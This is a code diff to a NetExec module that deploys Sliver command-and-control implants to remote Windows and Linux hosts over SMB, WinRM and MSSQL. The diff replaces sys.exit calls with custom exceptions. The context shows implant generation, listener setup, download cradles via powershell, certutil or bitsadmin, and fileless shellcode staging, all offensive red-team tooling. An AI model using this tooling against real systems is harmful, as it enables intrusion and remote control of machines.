@@ -46,6 +46,16 @@ rpcpb = None
 rpc_grpc = None
 
 
+class ModuleValidationError(Exception):
+    """Raised when module option validation fails."""
+    pass
+
+
+class ModuleExecutionError(Exception):
+    """Raised when module execution fails."""
+    pass
+
+
 class GrpcWorker:
     """
     Dedicated worker thread for gRPC operations with persistent event loop.
@@ -768,7 +778,7 @@ class NXCModule:
                 context.log.fail(f"Unknown option: {key}")
                 context.log.fail("Valid options: RHOST, RPORT, STAGING, HTTP_STAGING_PORT, SHELLCODE_LISTENER_HOST, SHELLCODE_LISTENER_PORT, SHELLCODE_PROTOCOL, DOWNLOAD_TOOL, BEACON_INTERVAL, BEACON_JITTER, OS, ARCH, CLEANUP_MODE, WAIT, PROFILE")
                 context.log.fail("See: nxc <protocol> -M sliver_exec --options")
-                sys.exit(1)
+                raise ModuleValidationError("Unknown option provided")
 
         # Acceptable option sets:
         #  - RHOST (with optional RPORT, defaults to 443)
@@ -785,7 +795,7 @@ class NXCModule:
             context.log.fail("  Using PROFILE: -o PROFILE=my_profile")
             context.log.fail("")
             context.log.fail("See: nxc <protocol> -M sliver_exec --options")
-            sys.exit(1)
+            raise ModuleValidationError("Missing required option")
 
         # If RHOST provided, validate it and optional RPORT
         if has_rhost:
@@ -797,7 +807,7 @@ class NXCModule:
                 context.log.fail(f"RHOST must be a valid IPv4 address: {module_options['RHOST']}")
                 context.log.fail("")
                 context.log.fail("Example: -o RHOST=10.0.0.5")
-                sys.exit(1)
+                raise ModuleValidationError("Invalid RHOST")
 
             # Validate RPORT if provided (optional, defaults to 443)
             if module_options.get("RPORT"):
@@ -809,13 +819,13 @@ class NXCModule:
                     context.log.fail(f"RPORT must be a valid port number (1-65535): {module_options['RPORT']}")
                     context.log.fail("")
                     context.log.fail("Example: -o RHOST=10.0.0.5 RPORT=8888")
-                    sys.exit(1)
+                    raise ModuleValidationError("Invalid RPORT")
 
         # If PROFILE provided, validate simple presence (more validation occurs later)
         if has_profile:
             if not module_options.get("PROFILE"):
                 context.log.fail("PROFILE cannot be empty")
-                sys.exit(1)
+                raise ModuleValidationError("Invalid PROFILE")
 
         # For staging, validate stager options if provided
         staging_value = module_options.get("STAGING", "none")
@@ -823,7 +833,7 @@ class NXCModule:
         # Validate STAGING value
         if staging_value not in ("download", "shellcode", "none", "false", "0", "no"):
             context.log.fail("STAGING must be 'download', 'shellcode', or 'none' (default: none)")
-            sys.exit(1)
+            raise ModuleValidationError("Invalid STAGING value")
 
         staging_enabled = staging_value in ("download", "shellcode")
 
@@ -836,7 +846,7 @@ class NXCModule:
                     ipaddress.IPv4Address(module_options["SHELLCODE_LISTENER_HOST"])
                 except ipaddress.AddressValueError:
                     context.log.fail(f"SHELLCODE_LISTENER_HOST must be a valid IPv4 address: {module_options['SHELLCODE_LISTENER_HOST']}")
-                    sys.exit(1)
+                    raise ModuleValidationError("Invalid SHELLCODE_LISTENER_HOST")
 
             # Validate SHELLCODE_LISTENER_PORT if provided (for shellcode staging)
             if module_options.get("SHELLCODE_LISTENER_PORT"):
@@ -846,7 +856,7 @@ class NXCModule:
                         raise ValueError()
                 except (ValueError, TypeError):
                     context.log.fail(f"SHELLCODE_LISTENER_PORT must be a valid port number (1-65535): {module_options['SHELLCODE_LISTENER_PORT']}")
-                    sys.exit(1)
+                    raise ModuleValidationError("Invalid SHELLCODE_LISTENER_PORT")
 
             # Validate HTTP_STAGING_PORT if provided (for download staging)
             http_staging_port = module_options.get("HTTP_STAGING_PORT")
@@ -859,7 +869,7 @@ class NXCModule:
                     context.log.fail(f"HTTP_STAGING_PORT must be a valid port number (1-65535): {http_staging_port}")
                     context.log.fail("")
                     context.log.fail("Example: -o STAGING=download HTTP_STAGING_PORT=8080")
-                    sys.exit(1)
+                    raise ModuleValidationError("Invalid HTTP_STAGING_PORT")
 
             # Validate SHELLCODE_PROTOCOL if provided (for shellcode staging)
             shellcode_protocol = module_options.get("SHELLCODE_PROTOCOL")
@@ -867,7 +877,7 @@ class NXCModule:
                 shellcode_protocol = shellcode_protocol.lower()
                 if shellcode_protocol not in ["http", "tcp", "https"]:
                     context.log.fail("SHELLCODE_PROTOCOL must be 'http', 'tcp', or 'https' (default: http)")
-                    sys.exit(1)
+                    raise ModuleValidationError("Invalid SHELLCODE_PROTOCOL")
 
             # Validate DOWNLOAD_TOOL if provided (for download staging)
             download_tool = module_options.get("DOWNLOAD_TOOL")
@@ -878,8 +888,8 @@ class NXCModule:
                     context.log.fail(f"DOWNLOAD_TOOL must be one of: {', '.join(valid_methods)} (default: powershell)")
                     context.log.fail("")
                     context.log.fail("Example: -o STAGING=download DOWNLOAD_TOOL=certutil")
-                    sys.exit(1)
-        
+                    raise ModuleValidationError("Invalid DOWNLOAD_TOOL")
+
         # Validate CLEANUP_MODE if provided
         cleanup_value = module_options.get("CLEANUP_MODE")
         if cleanup_value:
@@ -891,8 +901,8 @@ class NXCModule:
                 context.log.fail("  -o CLEANUP_MODE=always    # Always cleanup (default)")
                 context.log.fail("  -o CLEANUP_MODE=success   # Only cleanup if beacon registered")
                 context.log.fail("  -o CLEANUP_MODE=never     # Never cleanup")
-                sys.exit(1)
-        
+                raise ModuleValidationError("Invalid CLEANUP_MODE")
+
         # Validate BEACON_INTERVAL if provided
         beacon_interval = module_options.get("BEACON_INTERVAL")
         if beacon_interval:
@@ -904,8 +914,8 @@ class NXCModule:
                 context.log.fail(f"BEACON_INTERVAL must be between 1-3600 seconds: {beacon_interval}")
                 context.log.fail("")
                 context.log.fail("Example: -o BEACON_INTERVAL=10")
-                sys.exit(1)
-        
+                raise ModuleValidationError("Invalid BEACON_INTERVAL")
+
         # Validate BEACON_JITTER if provided
         beacon_jitter = module_options.get("BEACON_JITTER")
         if beacon_jitter:
@@ -917,8 +927,8 @@ class NXCModule:
                 context.log.fail(f"BEACON_JITTER must be between 0-3600 seconds: {beacon_jitter}")
                 context.log.fail("")
                 context.log.fail("Example: -o BEACON_JITTER=3")
-                sys.exit(1)
-        
+                raise ModuleValidationError("Invalid BEACON_JITTER")
+
         # Validate WAIT if provided
         wait = module_options.get("WAIT")
         if wait:
@@ -930,7 +940,7 @@ class NXCModule:
                 context.log.fail(f"WAIT must be between 1-3600 seconds: {wait}")
                 context.log.fail("")
                 context.log.fail("Example: -o WAIT=120")
-                sys.exit(1)
+                raise ModuleValidationError("Invalid WAIT")
 
     def _parse_module_options(self, context, module_options):
         """
@@ -1009,7 +1019,7 @@ class NXCModule:
         fmt = module_options.get("FORMAT", "exe").lower()
         if fmt not in ["exe", "executable"]:
             context.log.fail("Only EXECUTABLE format supported. Use: exe")
-            sys.exit(1)
+            raise ModuleValidationError("Invalid FORMAT")
         self.format, self.extension = ("EXECUTABLE", "exe")
 
     def _load_sliver_config(self, context):
@@ -1034,12 +1044,13 @@ class NXCModule:
         )
         if not os.path.exists(self.config_path):
             context.log.fail(f"Sliver config not found: {self.config_path}")
-            sys.exit(1)
+            raise ModuleExecutionError("Sliver config not found")
 
     def _fatal(self, context, msg):
-        """Log fatal message and exit (keeps existing behavior)."""
+        """Log fatal message and raise execution error (keeps existing behavior)."""
         context.log.fail(msg)
-        sys.exit(1)
+        raise ModuleExecutionError(msg)
+
 
     def _get_worker_and_connect(self):
         """Return shared GrpcWorker and ensure it's connected to current config."""
@@ -1173,7 +1184,8 @@ class NXCModule:
         """
         if self.config_path is None:
             context.log.fail("Sliver config_path not set. Ensure options() is called before running the module.")
-            sys.exit(1)
+            raise ModuleExecutionError("Sliver config_path not set")
+
 
         host = connection.host
         os_type, arch = self._detect_os_arch(context, connection)
@@ -1221,7 +1233,7 @@ class NXCModule:
                     # TCP/HTTP shellcode injection staging
                     if protocol != "winrm":
                         context.log.fail("Shellcode staging currently only supported on WinRM")
-                        sys.exit(1)
+                        raise ModuleExecutionError("Shellcode staging only supported on WinRM")
                     self.stage_port = self.rport  # Define if needed
                     # Ensure worker connected BEFORE any submits (fixes config_path=None in _do_connect)
                     _ = self._get_worker_and_connect()
@@ -1250,7 +1262,7 @@ class NXCModule:
                     success = handler.stage_execute(context, connection, os_type, self.stager_data)
                     if not success:
                         context.log.fail("Stager execution failed")
-                        sys.exit(1)
+                        raise ModuleExecutionError("Stager execution failed")
                     context.log.info(f"Stager executed on {host} via {protocol} (multi-stage {self.shellcode_protocol.upper()})")
                     full_remote_path = None  # In-memory; no cleanup needed
             else:
@@ -1394,8 +1406,8 @@ class NXCModule:
             # Reject Linux download tools (MSSQL targets Windows only)
             if self.download_tool in ["wget", "curl", "python"]:
                 context.log.fail(f"Download tool '{self.download_tool}' not supported for MSSQL (Windows-only protocol)")
-                sys.exit(1)
-            
+                raise ModuleValidationError("Invalid download tool for MSSQL")
+             
             # Increase socket timeout for download operation (17MB implant can take 30+ seconds)
             # NetExec's execute() handles xp_cmdshell enable/disable automatically via MSSQLEXEC
             original_timeout = None
@@ -1421,13 +1433,13 @@ class NXCModule:
             if self.download_tool in ["wget", "curl", "python"]:
                 context.log.fail(f"Download tool '{self.download_tool}' not supported for SMB staging (Windows-only)")
                 context.log.fail("Use STAGING=none for Linux/Samba targets, or use powershell/certutil/bitsadmin")
-                sys.exit(1)
-            
+                raise ModuleValidationError("Invalid download tool for SMB")
+             
             # Check if target is Linux/Samba - staging not supported
             if os_type != "windows":
                 context.log.fail("SMB HTTP staging only supported for Windows targets")
                 context.log.fail("Use STAGING=none for Linux/Samba targets")
-                sys.exit(1)
+                raise ModuleValidationError("SMB staging requires Windows target")
             
             # Execute via smbexec
             connection.execute(cmd, methods=["smbexec"])
@@ -1500,7 +1512,7 @@ class NXCModule:
                 context.log.fail("Solutions:")
                 context.log.fail("  1. Use a different port: -o HTTP_STAGING_PORT=8081")
                 context.log.fail("  2. In Sliver console, list active listeners with: jobs, kill existing listener: jobs -k <job_id>")
-                sys.exit(1)
+                raise ModuleExecutionError("Failed to generate implant")
             raise
         listener_job_id = listener_resp.JobID
         context.log.info(f"HTTP listener started (Job ID: {listener_job_id})")
@@ -1514,8 +1526,8 @@ class NXCModule:
             context.log.debug(f"Using {self.download_tool} staging method")
         except ValueError as e:
             context.log.fail(str(e))
-            sys.exit(1)
-        
+            raise ModuleExecutionError("Failed to build download cradle")
+
         context.log.info(f"Payload size: {len(cmd)} bytes")
         
         # 5. Execute on target
@@ -1547,14 +1559,14 @@ class NXCModule:
         if os_type is None:
             if not os_info:
                 context.log.fail("Could not detect OS. Use -o OS=windows|linux")
-                sys.exit(1)
+                raise ModuleValidationError("Could not detect OS")
 
             os_info_lower = str(os_info).lower()
             # Assume "unix" and "samba" are equivalent to "linux"
             os_type = "windows" if "windows" in os_info_lower else "linux" if any(x in os_info_lower for x in ["linux", "unix", "samba"]) else None
             if os_type is None:
                 context.log.fail(f"Unsupported OS: {os_info}")
-                sys.exit(1)
+                raise ModuleValidationError("Unsupported OS detected")
 
             context.log.debug(f"Detected OS: {os_type.title()}")
 
@@ -1585,10 +1597,11 @@ class NXCModule:
         # Final validation
         if os_type not in ("windows", "linux"):
             context.log.fail(f"Invalid OS: {os_type}")
-            sys.exit(1)
+            raise ModuleValidationError("Invalid OS")
         if arch not in ("amd64", "386"):
             context.log.fail(f"Invalid ARCH: {arch}")
-            sys.exit(1)
+            raise ModuleValidationError("Invalid ARCH")
+
 
         context.log.info(f"Using: {os_type.title()} {arch}")
         return os_type, arch
@@ -1632,12 +1645,13 @@ class NXCModule:
         profile_pb = next((p for p in profiles if getattr(p, 'Name', None) == self.profile), None)
         if not profile_pb:
             context.log.fail(f"Profile '{self.profile}' not found.")
-            sys.exit(1)
+            raise ModuleValidationError("Profile not found")
 
         # Check if profile platform matches detected host OS/arch
         if profile_pb.Config.GOOS != os_type or profile_pb.Config.GOARCH != arch:
             context.log.fail("Profile incompatible with host")
-            sys.exit(1)
+            raise ModuleValidationError("Profile incompatible with host")
+
 
         _import_protobuf()
         ic_local = clientpb.ImplantConfig()
@@ -1723,7 +1737,7 @@ class NXCModule:
             return resp.File.Data
         except Exception as e:
             context.log.fail(f"Failed to generate implant: {e}")
-            sys.exit(1)
+            raise ModuleExecutionError("Failed to generate implant")
 
     def _generate_sliver_stager(self, context, os_type, arch, implant_name, profile_name):
         """Generate tiny bootstrap stager for fileless shellcode staging.
